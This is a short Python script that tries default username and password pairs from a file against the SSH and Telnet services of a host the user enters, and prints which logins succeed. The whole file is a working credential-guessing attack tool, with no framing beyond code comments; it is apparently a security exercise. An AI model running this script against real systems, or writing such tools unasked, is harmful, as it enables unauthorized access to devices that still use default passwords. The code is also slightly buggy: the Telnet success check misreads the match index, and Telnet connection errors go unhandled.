import paramiko
import telnetlib
import socket


def SSHLogin(host,port,username,password):
    try:
        ssh = paramiko.SSHClient() # start SSH client
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # if public key not trusted, create a trusted key
        ssh.connect(host,port=port,username=username,password=password) # test credentials on SSH
        ssh_session = ssh.get_transport().open_session() # create session
        if ssh_session.active:
            print("SSH Login successful on %s:%s with username %s and password %s" % (host,port,username,password))
        ssh.close()
    except:
        print("SSH Login failed %s %s" % (username,password))
        

def TelnetLogin(host,port,username,password):
    tn = telnetlib.Telnet(host,port,timeout=1) # launch Telnet session
    tn.read_until(b"Login: ") # wait for login prompt
    tn.write((username + "\n").encode("utf-8")) # write username and encode with utf-8
    tn.read_until(b"Password: ") # then wait for password prompt
    tn.write((password + "\n").encode("utf-8")) # write passsword in password prompt. Then encode in utf-8
    try:
        result = tn.expect([b"Last login"]) # get last login time
        # if last login time is over 0
        if (result[0] > 0):
            # print out a login successful message
            print("Telnet login successful on %s:%s with username %s\
                and password %s" % (host,port,username,password))
        tn.close()
    # create exception for EOFError and timeout errors
    except (EOFError,socket.timeout):
        # print out a failure message
        print("Telnet login failed %s %s" % (username,password))
        
# get target info from the user
host = input("Enter target host IP address here: ")
sshport = 2200 # CAN BE CHANGED TO 22 AT ANY TIME. SSH port 22 or 2200
telnetport = 23 # telnet port 23
# open the defaults.txt file to read default credential pairs
with open("defaults.txt", "r") as f:
    # read thru lines
    for line in f:
        # split credentials and create a new array with them called vals
        vals = line.split()
        
        # create username variable with vals[0]
        username = vals[0].strip()
        
        # create password variable with vals[1]
        password = vals[1].strip()
        
        # call both functions with variables needed
        SSHLogin(host,sshport,username,password)
        TelnetLogin(host,telnetport,username,password)